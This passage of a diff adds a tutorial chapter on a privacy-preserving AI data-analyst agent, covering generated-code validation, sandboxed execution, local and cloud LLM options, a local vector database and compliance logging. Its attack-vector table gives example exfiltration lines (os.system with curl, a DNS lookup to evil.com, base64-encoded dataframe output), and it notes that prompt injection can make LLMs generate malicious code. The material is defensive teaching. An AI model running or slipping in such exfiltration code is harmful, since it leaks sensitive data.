+        elif isinstance(node.func, ast.Attribute):
+            return node.func.attr
+        return ""
+
+# Usage
+validator = EnhancedCodeValidator()
+is_valid, message, warnings = validator.validate(generated_code)
+
+if warnings:
+    print(f"Warnings: {warnings}")
+if not is_valid:
+    raise SecurityError(message)
+```
+
+### Common Attack Vectors (2024-2025)
+
+{/* IMAGE_PLACEHOLDER: Create a security threat matrix visualization:
+Show a grid/matrix of common attack vectors with visual examples. Each cell should contain:
+1. Direct Import Attack: Code snippet "import os" with a red shield blocking it
+2. Indirect Import Attack: Code snippet "__import__('os')" with detection radar catching it
+3. Base64 Exfiltration: Data being encoded into base64 string, caught by pattern detector
+4. DNS Exfiltration: Data being embedded in DNS query, blocked by network isolation
+5. Steganography: Data hidden in image pixels, caught by output size limits
+6. Timing Attack: Clock showing data encoded in execution time, blocked by timeout
+7. Error Message Exfil: Exception containing data, caught by error sanitization
+Each attack should show: the attack method (in red), the detection mechanism (in yellow), and the blocking action (in green).
+Style: Security matrix/dashboard design with threat level indicators. Use traffic light colors (red=threat, yellow=detection, green=blocked). Include code snippets and visual metaphors for each attack type. */}
+
+<Callout type="warning">
+  **Security Note**: LLMs can be manipulated via prompt injection to generate
+  malicious code. Always validate generated code, even from trusted models.
+</Callout>
+
+| Attack Vector           | Example                                    | Detection           |
+| :---------------------- | :----------------------------------------- | :------------------ |
+| **Direct import**       | `import os; os.system('curl ...')`         | Import blocklist    |
+| **Indirect import**     | `__import__('os').system(...)`             | Function blocklist  |
+| **Base64 exfil**        | `print(base64.b64encode(df.to_json()))`    | Exfil pattern regex |
+| **DNS exfil**           | `socket.gethostbyname(data + '.evil.com')` | Import blocklist    |
+| **Steganography**       | Hide data in chart pixels                  | Output size limits  |
+| **Timing attack**       | Encode data in execution time              | Timeout enforcement |
+| **Error message exfil** | `raise Exception(str(df.head()))`          | Error sanitization  |
+
+### Integration with Security Scanning Tools
+
+For production deployments, integrate with security scanning:
+
+```python
+# Optional: Integrate with Bandit for Python security scanning
+import subprocess
+import tempfile
+
+def scan_with_bandit(code: str) -> Tuple[bool, str]:
+    """Run Bandit security scanner on generated code."""
+    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
+        f.write(code)
+        f.flush()
+
+        result = subprocess.run(
+            ['bandit', '-f', 'json', f.name],
+            capture_output=True,
+            text=True,
+            timeout=30
+        )
+
+        if result.returncode != 0:
+            import json
+            issues = json.loads(result.stdout)
+            if issues.get('results'):
+                return False, f"Security issues found: {issues['results']}"
+
+        return True, "Bandit scan passed"
+```
+
+### Step 4: Secure Sandbox Execution
+
+{/* IMAGE_PLACEHOLDER: Create an illustration of the E2B sandbox execution environment:
+Show a secure, isolated container/sandbox (represented as a transparent box with thick walls and a lock icon). Inside the sandbox, show: the validated Python code, the sensitive data file, pandas/matplotlib libraries, and a Python interpreter running the analysis. Outside the sandbox, show blocked/prohibited elements with X marks: no network access (WiFi icon crossed out), no file system access (folder icon crossed out), no external API calls (cloud icon crossed out). Show results (charts, numbers) being safely extracted from the sandbox through a secure output channel. Include a timeout clock showing 60-second limit.
+Style: Architectural diagram showing isolation boundaries. Use a glass box metaphor for the sandbox to show transparency while maintaining security. Color scheme: sandbox interior in light blue (safe zone), exterior in neutral gray, blocked items in red. */}
+
+```python
+from e2b_code_interpreter import Sandbox
+
+def execute_in_sandbox(code: str, data_path: str) -> dict:
+    """Execute code in isolated E2B sandbox."""
+
+    # Validate first
+    is_valid, message = validate_code(code)
+    if not is_valid:
+        return {"error": message, "output": None, "chart": None}
+
+    with Sandbox() as sandbox:
+        # Upload the data file
+        with open(data_path, "rb") as f:
+            sandbox.files.write("data.csv", f)
+
+        # Prepare the execution code
+        full_code = f"""
+import pandas as pd
+import matplotlib.pyplot as plt
+import seaborn as sns
+
+# Load the data
+df = pd.read_csv('data.csv')
+
+# User's analysis code
+{code}
+"""
+
+        # Execute
+        execution = sandbox.run_code(full_code)
+
+        result = {
+            "output": execution.logs.stdout,
+            "error": execution.error.message if execution.error else None,
+            "chart": None
+        }
+
+        # Check for generated chart
+        for item in execution.results:
+            if item.png:
+                result["chart"] = item.png  # Base64 encoded
+
+        return result
+```
+
+### E2B with Custom Templates (2024)
+
+For production deployments, use custom templates to reduce cold start times:
+
+```python
+from e2b_code_interpreter import Sandbox
+
+# Create a custom template with pre-installed dependencies
+# (Done once via E2B CLI: e2b template build)
+
+def execute_with_custom_template(code: str, data_path: str) -> dict:
+    """Execute using pre-configured template."""
+
+    # Use custom template with pandas, matplotlib pre-installed
+    with Sandbox(template="data-analyst-v1") as sandbox:
+        # Template already has dependencies - faster startup
+
+        with open(data_path, "rb") as f:
+            sandbox.files.write("data.csv", f)
+
+        execution = sandbox.run_code(code)
+
+        return {
+            "output": execution.logs.stdout,
+            "error": execution.error.message if execution.error else None,
+            "chart": next(
+                (item.png for item in execution.results if item.png),
+                None
+            )
+        }
+
+# For persistent sessions (stateful analysis)
+def create_persistent_session(data_path: str) -> str:
+    """Create a persistent sandbox for multi-turn analysis."""
+    sandbox = Sandbox(template="data-analyst-v1", timeout=3600)
+
+    # Load data once
+    with open(data_path, "rb") as f:
+        sandbox.files.write("data.csv", f)
+
+    sandbox.run_code("""
+import pandas as pd
+import matplotlib.pyplot as plt
+df = pd.read_csv('data.csv')
+print(f"Loaded {len(df)} rows")
+""")
+
+    # Return sandbox ID for future requests
+    return sandbox.sandbox_id
+```
+
+---
+
+## 15.4 Secure Sandbox Execution with E2B
+
+[E2B](https://e2b.dev) provides cloud-based sandboxes for secure code execution. As of 2024-2025, E2B has evolved significantly with new features for production deployments.
+
+### E2B Features (2024-2025)
+
+| Feature                  | Description                                   | Use Case                                    |
+| :----------------------- | :-------------------------------------------- | :------------------------------------------ |
+| **Custom Templates**     | Pre-built environments with your dependencies | Faster cold starts, consistent environments |
+| **Persistent Sandboxes** | Sandboxes that survive across requests        | Stateful analysis sessions, caching         |
+| **File System Access**   | Read/write files within sandbox               | Data processing, chart generation           |
+| **Streaming Output**     | Real-time stdout/stderr streaming             | Long-running analyses, progress feedback    |
+| **GPU Support**          | NVIDIA GPU access for ML workloads            | Local model inference in sandbox            |
+
+### E2B Pricing Tiers (2024)
+
+<Callout type="warning">
+  **Free Tier Limitations**: E2B's free tier includes limited sandbox hours per
+  month. For production workloads with sensitive data, consider the Pro tier or
+  self-hosted alternatives.
+</Callout>
+
+| Tier           | Sandbox Hours   | Features                               | Best For             |
+| :------------- | :-------------- | :------------------------------------- | :------------------- |
+| **Hobby**      | 100 hrs/month   | Basic sandboxes, community support     | Development, testing |
+| **Pro**        | 1000+ hrs/month | Custom templates, priority support     | Production workloads |
+| **Enterprise** | Unlimited       | VPC deployment, SLA, dedicated support | Regulated industries |
+
+### Alternative Sandboxing Options
+
+When E2B isn't the right fit, consider these alternatives:
+
+```python
+# Option 1: Modal - Serverless Python execution
+import modal
+
+app = modal.App("secure-analyst")
+
+@app.function(
+    image=modal.Image.debian_slim().pip_install("pandas", "matplotlib"),
+    secrets=[modal.Secret.from_name("analyst-secrets")]
+)
+def analyze_in_modal(code: str, data: bytes) -> dict:
+    """Execute analysis code in Modal's secure environment."""
+    import pandas as pd
+    from io import BytesIO
+
+    df = pd.read_csv(BytesIO(data))
+    local_scope = {"df": df, "pd": pd}
+    exec(code, {"__builtins__": {}}, local_scope)
+    return local_scope.get("result", {})
+
+# Option 2: Docker-based local sandbox
+import docker
+
+def execute_in_docker(code: str, data_path: str) -> dict:
+    """Execute code in isolated Docker container."""
+    client = docker.from_env()
+
+    container = client.containers.run(
+        "python:3.11-slim",
+        command=["python", "-c", code],
+        volumes={data_path: {"bind": "/data", "mode": "ro"}},
+        network_disabled=True,  # No network access
+        mem_limit="512m",
+        cpu_period=100000,
+        cpu_quota=50000,  # 50% CPU
+        remove=True,
+        detach=False
+    )
+    return {"output": container.decode()}
+```
+
+### When to Use Each Option
+
+| Scenario                    | Recommended         | Reason                             |
+| :-------------------------- | :------------------ | :--------------------------------- |
+| **Quick prototyping**       | E2B                 | Fast setup, managed infrastructure |
+| **Air-gapped environments** | Docker              | No external dependencies           |
+| **High-volume production**  | Modal               | Better scaling, cost efficiency    |
+| **Maximum control**         | Daytona/Self-hosted | Full infrastructure ownership      |
+| **GPU workloads**           | Modal or E2B Pro    | Native GPU support                 |
+
+<Callout type="info">
+  **Daytona** (open-source, 2024) provides self-hosted development environments
+  with security isolation. Consider it for organizations requiring on-premises
+  sandbox infrastructure.
+</Callout>
+
+---
+
+## 15.4.1 Local LLM Option
+
+{/* IMAGE_PLACEHOLDER: Create a comparison diagram showing Cloud LLM vs Local LLM data flows:
+LEFT SIDE - Cloud LLM: Show schema data traveling over the internet (with WiFi/cloud icons) to external LLM API servers (OpenAI, Anthropic, etc.), with labels showing "Schema metadata exposed" and "Network latency 1-5s". Use orange/yellow colors to indicate some risk.
+RIGHT SIDE - Local LLM: Show schema data staying within a local boundary (represented by a house/building icon or local network), processed by Ollama running on local hardware (laptop/server icon), with labels showing "100% on-premises", "Zero external exposure", and "Network latency 5-30s". Use green colors to indicate maximum security.
+CENTER: Show a decision point/fork with factors to consider: "Hardware available?", "Quality requirements?", "Compliance needs?", "Latency tolerance?"
+Style: Side-by-side comparison diagram with clear visual distinction between cloud and local processing. Use network/connectivity icons, security badges, and performance indicators. Include a decision tree or flowchart element to help choose between options. */}
+
+For maximum privacy, use a local LLM:
+
+```python
+from langchain_community.llms import Ollama
+
+def create_local_analyst():
+    """Create analyst using local Ollama model."""
+
+    # Use a code-focused model
+    llm = Ollama(model="codellama:13b")
+
+    # Or use Mistral for better reasoning
+    # llm = Ollama(model="mistral:7b")
+
+    return llm
+
+# The schema never leaves your machine
+# The code never leaves your machine
+# Only the results are shown to the user
+```
+
+---
+
+## 15.4.2 Privacy-Preserving LLM Providers
+
+When local LLMs aren't feasible (due to hardware constraints or quality requirements), several cloud providers offer enterprise-grade privacy guarantees.
+
+### Cloud Providers with Data Residency
+
+<Callout type="warning">
+  **Important**: Even with privacy guarantees, cloud APIs still receive your
+  schema information. For truly sensitive column names (e.g., "hiv_status",
+  "criminal_record"), use schema anonymization or local LLMs.
+</Callout>
+
+#### Azure OpenAI Service
+
+```python
+from langchain_openai import AzureChatOpenAI
+
+# Azure OpenAI with data residency guarantees
+llm = AzureChatOpenAI(
+    azure_deployment="gpt-4o",
+    azure_endpoint="https://your-resource.openai.azure.com/",
+    api_version="2024-08-01-preview",
+    # Data stays in your Azure region
+    # No training on your data
+    # SOC2, HIPAA BAA available
+)
+```
+
+**Azure Privacy Features (2024-2025)**:
+
+- Data residency in 60+ regions
+- Customer-managed keys (CMK) for encryption
+- Private endpoints via Azure Private Link
+- HIPAA BAA, SOC2 Type II, FedRAMP High certified
+- Abuse monitoring can be disabled for approved use cases
+
+#### AWS Bedrock
+
+```python
+from langchain_aws import ChatBedrock
+
+# AWS Bedrock with VPC endpoints
+llm = ChatBedrock(
+    model_id="anthropic.claude-3-5-sonnet-20241022-v2:0",
+    region_name="us-east-1",
+    # Configure VPC endpoint for private connectivity
+    # endpoint_url="https://vpce-xxx.bedrock.us-east-1.vpce.amazonaws.com"
+)
+```
+
+**AWS Bedrock Privacy Features**:
+
+- VPC endpoints (no public internet)
+- AWS PrivateLink support
+- Data never leaves your AWS account
+- CloudTrail audit logging
+- Guardrails for content filtering
+
+#### Google Vertex AI
+
+```python
+from langchain_google_vertexai import ChatVertexAI
+
+# Vertex AI with customer-managed encryption
+llm = ChatVertexAI(
+    model_name="gemini-1.5-pro",
+    project="your-project-id",
+    location="us-central1",
+    # CMEK encryption available
+    # VPC Service Controls supported
+)
+```
+
+**Vertex AI Privacy Features**:
+
+- Customer-managed encryption keys (CMEK)
+- VPC Service Controls perimeter
+- Data residency controls
+- Access Transparency logs
+
+### Anthropic Data Handling
+
+Anthropic (Claude) offers specific data handling policies:
+
+```python
+from langchain_anthropic import ChatAnthropic
+
+llm = ChatAnthropic(
+    model="claude-3-5-sonnet-20241022",
+    # API requests are not used for training
+    # 30-day data retention (can be reduced)
+    # SOC2 Type II certified
+)
+```
+
+**Anthropic Privacy Policies (2024)**:
+
+- No training on API data by default
+- Configurable data retention (0-30 days)
+- Trust & Safety review only when flagged
+- Enterprise plans with custom DPAs
+
+### Decision Matrix: Cloud vs Local
+
+| Factor            | Cloud APIs              | Local LLMs                         |
+| :---------------- | :---------------------- | :--------------------------------- |
+| **Data exposure** | Schema sent to provider | Nothing leaves premises            |
+| **Quality**       | State-of-the-art models | Good, improving rapidly            |
+| **Latency**       | 1-5 seconds             | 5-30 seconds (depends on hardware) |
+| **Cost**          | Per-token pricing       | Hardware + electricity             |
+| **Compliance**    | Provider certifications | Full control                       |
+| **Audit**         | Provider logs           | Complete local logs                |
+
+<Callout type="tip">
+  **Hybrid Approach**: Use local LLMs for initial schema analysis and code
+  generation, then optionally use cloud APIs for result summarization (which
+  contains only aggregated, non-sensitive data).
+</Callout>
+
+---
+
+## 15.5 Vector Database: LanceDB
+
+{/* IMAGE_PLACEHOLDER: Create a diagram showing local-first RAG architecture with LanceDB:
+Show a complete data flow: 1) Sensitive documents (PDFs, reports) on the left, 2) Local embedding model (sentence-transformers) processing documents without any cloud API calls (emphasize "100% Local" badge), 3) LanceDB embedded database storing vectors on local disk (show disk icon with database symbol), 4) Query flow showing user question being embedded locally, searching LanceDB, and retrieving relevant chunks, 5) Results being used for analysis - all within a secure perimeter (drawn as a boundary around the entire system). Outside the perimeter, show crossed-out cloud APIs to emphasize no external calls.
+Style: Architecture diagram with clear data flow arrows. Use green/blue colors for the secure local environment, with a prominent boundary line. Include icons for documents, embeddings (vector representations), database, and local processing. Add "No Cloud API Calls" badges at key points. */}
+
+For local-first RAG over sensitive documents, [LanceDB](https://lancedb.github.io/lancedb/) provides an embedded vector database that runs entirely on your machine—no external API calls required.
+
+```python
+import lancedb
+from lancedb.embeddings import get_registry
+from lancedb.pydantic import LanceModel, Vector
+
+# Use local embeddings (no API calls)
+embeddings = get_registry().get("sentence-transformers").create(
+    name="all-MiniLM-L6-v2"
+)
+
+class Document(LanceModel):
+    text: str = embeddings.SourceField()
+    vector: Vector(384) = embeddings.VectorField()
+    source: str
+    page: int
+
+# Create local database (stored on disk)
+db = lancedb.connect("./secure_docs_db")
+table = db.create_table("documents", schema=Document)
+
+# Add documents (all local, no API calls)
+table.add([
+    {"text": chunk, "source": "report.pdf", "page": i}
+    for i, chunk in enumerate(chunks)
+])
+
+# Query (all local)
+results = table.search("revenue analysis").limit(5).to_list()
+```
+
+### Why LanceDB for Privacy?
+
+| Feature              | Benefit                           |
+| :------------------- | :-------------------------------- |
+| **Embedded**         | Runs in-process, no server needed |
+| **Local embeddings** | Use sentence-transformers locally |
+| **Disk-based**       | Data never leaves your machine    |
+| **SQL-like queries** | Familiar filtering and search     |
+| **Lance format**     | Efficient columnar storage        |
+
+### LanceDB Cloud (2024)
+
+<Callout type="info">
+  **New in 2024**: LanceDB Cloud offers a managed option while maintaining
+  strong privacy guarantees. Data is encrypted at rest and in transit, with
+  optional customer-managed keys.
+</Callout>
+
+```python
+import lancedb
+
+# LanceDB Cloud connection (managed option)
+db = lancedb.connect(
+    "db://your-project",
+    api_key="ldb_xxx",
+    region="us-east-1"  # Data residency control
+)
+
+# Same API as local LanceDB
+table = db.open_table("documents")
+results = table.search(query_vector).limit(10).to_list()
+```
+
+### Hybrid Search (Vector + Full-Text)
+
+LanceDB now supports hybrid search combining semantic and keyword matching:
+
+```python
+# Hybrid search: vector similarity + full-text matching
+results = (
+    table
+    .search("quarterly revenue report", query_type="hybrid")
+    .limit(10)
+    .to_pandas()
+)
+
+# Weighted hybrid search
+results = (
+    table
+    .search("revenue analysis")
+    .rerank(
+        reranker=lancedb.rerankers.LinearCombinationReranker(weight=0.7)
+    )
+    .limit(10)
+    .to_list()
+)
+```
+
+### Comparison: Local-First Vector Databases
+
+| Feature              | LanceDB            | Chroma              | Qdrant (Local)      |
+| :------------------- | :----------------- | :------------------ | :------------------ |
+| **Deployment**       | Embedded or Cloud  | Embedded or Server  | Server (Docker)     |
+| **Storage**          | Lance columnar     | SQLite + Parquet    | Custom binary       |
+| **Hybrid Search**    | ✅ Native          | ❌ Vector only      | ✅ Native           |
+| **Local Embeddings** | ✅ Built-in        | ✅ Via integrations | ✅ Via integrations |
+| **Disk Efficiency**  | Excellent          | Good                | Good                |
+| **Max Dataset Size** | 100M+ vectors      | ~1M vectors         | 10M+ vectors        |
+| **Privacy**          | Full local control | Full local control  | Full local control  |
+
+### Performance Benchmarks (Local Embeddings)
+
+Using `all-MiniLM-L6-v2` on Apple M2 Pro:
+
+| Operation               | LanceDB | Chroma | Notes                        |
+| :---------------------- | :------ | :----- | :--------------------------- |
+| **Embedding (1K docs)** | 12s     | 12s    | Same model, same speed       |
+| **Index Creation**      | 0.8s    | 1.2s   | LanceDB's Lance format       |
+| **Query (top-10)**      | 2ms     | 5ms    | LanceDB's columnar advantage |
+| **Hybrid Query**        | 8ms     | N/A    | Full-text + vector           |
+| **Memory (100K docs)**  | 180MB   | 320MB  | LanceDB more efficient       |
+
+<Callout type="tip">
+  **Recommendation**: For privacy-first RAG with documents under 1M chunks,
+  LanceDB provides the best balance of performance, features, and simplicity.
+  For larger deployments, consider Qdrant in local Docker mode.
+</Callout>
+
+---
+
+## 15.6 Complete Agent
+
+```python
+from typing import TypedDict
+from langgraph.graph import StateGraph, END
+
+class AnalystState(TypedDict):
+    query: str
+    data_path: str
+    schema: dict
+    generated_code: str
+    validation_result: str
+    execution_result: dict
+    final_answer: str
+
+def schema_node(state: AnalystState) -> dict:
+    df = pd.read_csv(state["data_path"])
+    schema = extract_safe_schema(df)
+    return {"schema": schema}
+
+def codegen_node(state: AnalystState) -> dict:
+    code = generate_analysis_code(state["schema"], state["query"])
+    return {"generated_code": code}
+
+def validate_node(state: AnalystState) -> dict:
+    is_valid, message = validate_code(state["generated_code"])
+    return {"validation_result": "valid" if is_valid else message}
+
+def execute_node(state: AnalystState) -> dict:
+    if state["validation_result"] != "valid":
+        return {"execution_result": {"error": state["validation_result"]}}
+
+    result = execute_in_sandbox(
+        state["generated_code"],
+        state["data_path"]
+    )
+    return {"execution_result": result}
+
+def summarize_node(state: AnalystState) -> dict:
+    """Summarize results for the user."""
+    result = state["execution_result"]
+
+    if result.get("error"):
+        return {"final_answer": f"Analysis failed: {result['error']}"}
+
+    llm = ChatOpenAI(model="gpt-4o")
+
+    summary = llm.invoke(f"""
+    The user asked: {state["query"]}
+
+    The analysis produced this output:
+    {result["output"]}
+
+    Summarize the findings in a clear, concise way.
+    """)
+
+    return {"final_answer": summary.content}
+
+def build_analyst():
+    workflow = StateGraph(AnalystState)
+
+    workflow.add_node("extract_schema", schema_node)
+    workflow.add_node("generate_code", codegen_node)
+    workflow.add_node("validate", validate_node)
+    workflow.add_node("execute", execute_node)
+    workflow.add_node("summarize", summarize_node)
+
+    workflow.set_entry_point("extract_schema")
+    workflow.add_edge("extract_schema", "generate_code")
+    workflow.add_edge("generate_code", "validate")
+    workflow.add_edge("validate", "execute")
+    workflow.add_edge("execute", "summarize")
+    workflow.add_edge("summarize", END)
+
+    return workflow.compile()
+
+# Usage
+analyst = build_analyst()
+
+result = analyst.invoke({
+    "query": "What's the correlation between age and income?",
+    "data_path": "./sensitive_customer_data.csv"
+})
+
+print(result["final_answer"])
+```
+
+---
+
+## 15.7 Privacy Guarantees
+
+{/* IMAGE_PLACEHOLDER: Create a privacy data flow diagram showing what data goes where:
+Create a vertical flow chart with three zones (color-coded):
+RED ZONE (Never Exposed): Raw data values shown in a locked vault - "Customer names", "SSN", "Medical records", "Financial transactions" - with multiple locks and "NEVER LEAVES SECURE PERIMETER" label
+YELLOW ZONE (Metadata Only): Schema information shown in transit to LLM - "Column names", "Data types", "Row counts", "Basic statistics" - with warning symbol and "ANONYMIZATION OPTIONAL" note
+GREEN ZONE (Safe to Share): Analysis results and charts shown being delivered to user - "Aggregated statistics", "Visualizations", "Insights", "Summaries" - with checkmark and "SAFE TO DISPLAY" label
+Use arrows to show the flow and barriers/walls between zones. Include a legend explaining the security levels.
+Style: Security-focused data flow diagram with clear visual separation between security zones. Use traffic light colors (red=sensitive, yellow=caution, green=safe). Include icons for different data types and security barriers. */}
+
+| Data             | Exposure                           |
+| :--------------- | :--------------------------------- |
+| Raw data values  | ❌ Never leaves secure perimeter   |
+| Column names     | ⚠️ Sent to LLM (can be anonymized) |
+| Data types       | ⚠️ Sent to LLM                     |
+| Row count        | ⚠️ Sent to LLM                     |
+| Analysis results | ✅ Shown to user                   |
+| Generated charts | ✅ Shown to user                   |
+
+### Additional Hardening
+
+{/* IMAGE_PLACEHOLDER: Create an interactive diagram showing the anonymization process:
+Show a before/after comparison with an interactive toggle. BEFORE: Real schema with sensitive column names highlighted in red ("ssn", "hiv_status", "criminal_record", "salary", "credit_score"). AFTER: Anonymized schema with generic labels ("column_0", "column_1", "column_2", "column_3", "column_4") in safe green color. Include a mapping table showing the transformation with bidirectional arrows. Add visual indicators showing this happens BEFORE sending to LLM (with a shield icon) and gets reversed AFTER code generation (with a key icon for de-anonymization).
+Style: Interactive educational diagram with toggle/slider to show transformation. Use color coding: red for sensitive names, green for anonymized names. Include arrows showing the flow and timing of anonymization/de-anonymization in the pipeline. */}
+
+{/* INTERACTIVE_COMPONENT_SUGGESTION: Schema Anonymization Playground
+Create an interactive tool where learners can:
+1. Input their own column names (or use preset examples like "patient_ssn", "credit_card", "medical_diagnosis")
+2. See the anonymization process in real-time (column names → column_0, column_1, etc.)
+3. Input a sample query like "What's the average of patient_ssn?"
+4. See how the LLM receives the anonymized version: "What's the average of column_0?"
+5. View generated code with anonymized names
+6. See the de-anonymization step that converts code back to use real column names
+7. Toggle between "Show to LLM" view and "Execute in Sandbox" view
+This helps learners understand the complete anonymization workflow and builds confidence in the privacy-preserving approach.
+Component location: After the "Additional Hardening" code block, before section 15.8 */}
+
+```python
+def anonymize_schema(schema: dict) -> dict:
+    """Replace column names with generic labels."""
+    anonymized = schema.copy()
+    column_map = {}
+
+    for i, col in enumerate(anonymized["columns"]):
+        original_name = col["name"]
+        anonymous_name = f"column_{i}"
+        column_map[anonymous_name] = original_name
+        col["name"] = anonymous_name
+
+    return anonymized, column_map
+
+def deanonymize_code(code: str, column_map: dict) -> str:
+    """Replace anonymous names with real names before execution."""
+    for anon, real in column_map.items():
+        code = code.replace(f"'{anon}'", f"'{real}'")
+        code = code.replace(f'"{anon}"', f'"{real}"')
+    return code
+```
+
+---
+
+## 15.8 Compliance Considerations
+
+{/* IMAGE_PLACEHOLDER: Create an infographic showing the three major compliance frameworks:
+Top section: GDPR shield with EU flag colors, showing key requirements (data minimization, right to erasure, human oversight, explainability) with checkmark icons.
+Middle section: HIPAA shield with medical cross symbol, showing technical safeguards (access control, audit controls, integrity controls, transmission security) with lock icons.
+Bottom section: SOC2 shield with enterprise/building icon, showing trust service criteria (logical access, system boundaries, data transmission, system monitoring, incident response) with monitoring icons.
+In the center, show how the Local Data Analyst architecture addresses all three: schema-only approach, local processing, audit logging, sandbox isolation. Use connecting lines to show which architectural features satisfy which compliance requirements.
+Style: Professional compliance infographic with shield/badge designs for each framework. Use official colors where applicable (EU blue/yellow for GDPR, medical blue for HIPAA, corporate blue/gray for SOC2). Clean, authoritative design suitable for enterprise presentations. */}
+
+When deploying privacy-preserving agents in regulated industries, understanding compliance requirements is essential. This section covers key regulations and implementation patterns.
+
+### GDPR Article 22: Automated Decision-Making
+
+<Callout type="warning">
+  **Legal Requirement**: Under GDPR Article 22, individuals have the right not
+  to be subject to decisions based solely on automated processing that
+  significantly affect them. This applies to AI-driven data analysis.
+</Callout>
+
+**Requirements for GDPR Compliance**:
+
+| Requirement           | Implementation                                     |
+| :-------------------- | :------------------------------------------------- |
+| **Human oversight**   | Add human-in-the-loop for consequential decisions  |
+| **Explainability**    | Log reasoning chain, not just results              |
+| **Right to contest**  | Provide mechanism to challenge automated decisions |
+| **Data minimization** | Process only necessary data (schema-only helps!)   |
+
+```python
+class GDPRCompliantAnalyst:
+    """Analyst with GDPR Article 22 compliance features."""
+
+    def analyze(self, query: str, data_path: str) -> dict:
+        result = self.agent.invoke({
+            "query": query,
+            "data_path": data_path
+        })
+
+        # GDPR: Log the decision-making process
+        audit_log = {
+            "timestamp": datetime.utcnow().isoformat(),
+            "query": query,
+            "schema_sent": result["schema"],  # What LLM saw
+            "code_generated": result["generated_code"],
+            "human_review_required": self._requires_human_review(result),
+            "data_subjects_affected": self._count_affected(data_path),
+        }
+
+        self._write_audit_log(audit_log)
+
+        # Flag for human review if consequential
+        if audit_log["human_review_required"]:
+            result["status"] = "pending_human_review"
+            result["review_reason"] = "Automated decision affecting individuals"
+
+        return result
+
+    def _requires_human_review(self, result: dict) -> bool:
+        """Determine if decision requires human oversight."""
+        consequential_keywords = [
+            "eligibility", "approval", "denial", "score",
+            "risk", "fraud", "terminate", "reject"
+        ]
+        query_lower = result.get("query", "").lower()
+        return any(kw in query_lower for kw in consequential_keywords)
+```
+
+### HIPAA Technical Safeguards
+
+For healthcare data (PHI), HIPAA requires specific technical safeguards:
+
+```python
+class HIPAACompliantAnalyst:
+    """Analyst meeting HIPAA technical safeguard requirements."""
+
+    # HIPAA §164.312(a)(1): Access Control
+    def __init__(self, user_credentials: dict):
+        self._verify_authorization(user_credentials)
+        self._session_id = self._create_audit_session()
+
+    # HIPAA §164.312(b): Audit Controls
+    def analyze(self, query: str, data_path: str) -> dict:
+        # Log all access attempts
+        self._log_access_attempt(query, data_path)
+
+        try:
+            result = self._execute_analysis(query, data_path)
+            self._log_access_success(result)
+            return result
+        except Exception as e:
+            self._log_access_failure(str(e))
+            raise
+
+    # HIPAA §164.312(c)(1): Integrity Controls
+    def _execute_analysis(self, query: str, data_path: str) -> dict:
+        # Verify data integrity before analysis
+        data_hash = self._compute_hash(data_path)
+
+        result = self.agent.invoke({"query": query, "data_path": data_path})
+
+        # Verify data wasn't modified
+        if self._compute_hash(data_path) != data_hash:
+            raise IntegrityError("Data modified during analysis")
+
+        return result
+
+    # HIPAA §164.312(e)(1): Transmission Security
+    # Handled by: Local execution (no transmission) or TLS for cloud APIs
+```
+
+**HIPAA Audit Log Requirements**:
+
+```python
+HIPAA_AUDIT_SCHEMA = {
+    "event_id": "uuid",
+    "timestamp": "ISO8601",
+    "user_id": "authenticated user",
+    "action": "query|export|view",
+    "resource": "dataset identifier",
+    "phi_accessed": "boolean",
+    "outcome": "success|failure",
+    "client_ip": "for access tracking",
+    "session_id": "for session correlation",
+}
+```
+
+### SOC2 Type II Requirements
+
+For enterprise deployments, SOC2 Type II certification requires demonstrating controls over time:
+
+| SOC2 Criteria                | Implementation for Data Analyst                   |
+| :--------------------------- | :------------------------------------------------ |
+| **CC6.1: Logical Access**    | Role-based access to datasets                     |
+| **CC6.6: System Boundaries** | Sandbox isolation, network restrictions           |
+| **CC6.7: Data Transmission** | TLS 1.3 for API calls, local processing preferred |
+| **CC7.2: System Monitoring** | Comprehensive audit logging                       |
+| **CC7.3: Incident Response** | Alerting on validation failures                   |
+
+```python
+class SOC2AuditLogger:
+    """Audit logging meeting SOC2 requirements."""
+
+    def log_event(self, event_type: str, details: dict):
+        event = {
+            "id": str(uuid.uuid4()),
+            "timestamp": datetime.utcnow().isoformat() + "Z",
+            "event_type": event_type,
+            "service": "local-data-analyst",
+            "version": "1.0.0",
+            "details": details,
+            # SOC2: Immutable logging
+            "hash": self._compute_event_hash(details),
+        }
+
+        # Write to append-only log
+        self._append_to_audit_log(event)
+
+        # SOC2 CC7.2: Real-time monitoring
+        if event_type in ["VALIDATION_FAILURE", "UNAUTHORIZED_ACCESS"]:
+            self._send_security_alert(event)
+```
+
+### Data Retention and Deletion
+
+<Callout type="info">
+  **GDPR Right to Erasure**: Users can request deletion of their data. Your
+  system must support this without breaking audit trails.
+</Callout>
+
+```python
+class DataRetentionManager:
+    """Manage data retention per compliance requirements."""
+
+    RETENTION_POLICIES = {
+        "query_logs": 90,      # Days - for debugging
+        "audit_logs": 2555,    # 7 years - SOC2/HIPAA
+        "analysis_results": 30, # Days - GDPR minimization
+        "raw_data": 0,         # Never retained by analyst
+    }
+
+    def apply_retention_policy(self):
+        """Delete data exceeding retention period."""
+        for data_type, retention_days in self.RETENTION_POLICIES.items():
+            if retention_days == 0:
+                continue  # Never retained
+
+            cutoff = datetime.utcnow() - timedelta(days=retention_days)
+            self._delete_before(data_type, cutoff)
+
+    def handle_deletion_request(self, user_id: str):
+        """GDPR Article 17: Right to erasure."""
+        # Delete user's analysis results
+        self._delete_user_results(user_id)
+
+        # Anonymize audit logs (keep for compliance, remove PII)
+        self._anonymize_audit_logs(user_id)
+
+        # Log the deletion request itself (required for compliance)
+        self._log_deletion_request(user_id)
+```
+
+### Compliance Checklist
+
+{/* INTERACTIVE_COMPONENT_SUGGESTION: Compliance Assessment Tool
+Create an interactive compliance checker where learners can:
+1. Select their target compliance framework (GDPR, HIPAA, SOC2, or All)
+2. Answer yes/no questions about their implementation:
+   - "Do you send only schema (not data) to LLMs?" 
+   - "Do you validate all generated code?"
+   - "Do you log all data access attempts?"
+   - "Do you support data deletion requests?"
+   - etc.
+3. See real-time compliance score (e.g., "GDPR: 5/6 requirements met")
+4. Get specific recommendations for missing requirements
+5. Export a compliance report showing:
+   - Which requirements are satisfied
+   - Which need attention
+   - Implementation suggestions for gaps
+   - Relevant code examples from this module
+6. Compare their architecture against the reference implementation
+This tool helps learners assess their own implementations and understand compliance requirements practically.
+Component location: After the "Compliance Checklist" heading, before the GDPR/HIPAA/SOC2 checkbox lists */}
+
+Use this checklist when deploying to regulated environments:
+
+#### GDPR Compliance
+
+- [ ] Data minimization: Only schema sent to LLM
